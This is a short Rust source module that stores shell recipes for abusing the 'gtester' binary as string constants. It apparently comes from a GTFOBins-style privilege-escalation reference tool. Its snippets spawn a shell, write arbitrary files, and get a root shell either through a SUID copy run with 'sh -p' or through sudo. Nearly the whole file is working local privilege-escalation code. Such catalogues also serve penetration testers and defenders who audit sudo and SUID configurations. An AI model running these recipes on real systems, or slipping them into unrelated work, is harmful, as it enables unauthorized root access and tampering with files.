pub static BIN_NAME: &'static str = "gtester";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo '#!/bin/sh' > $TF
    echo 'exec /bin/sh -p 0<&1' >> $TF
    chmod +x $TF
    gtester -q $TF
"#;
pub static FW_DESC: &'static str = "Data to be written appears in an XML attribute in the output file (`<testbinary path='DATA'>`).";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    gtester "DATA" -o $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which gtester) .

    TF=$(mktemp)
    echo '#!/bin/sh -p' > $TF
    echo 'exec /bin/sh -p 0<&1' >> $TF
    chmod +x $TF
    sudo gtester -q $TF
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo '#!/bin/sh' > $TF
    echo 'exec /bin/sh 0<&1' >> $TF
    chmod +x $TF
    sudo gtester -q $TF
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
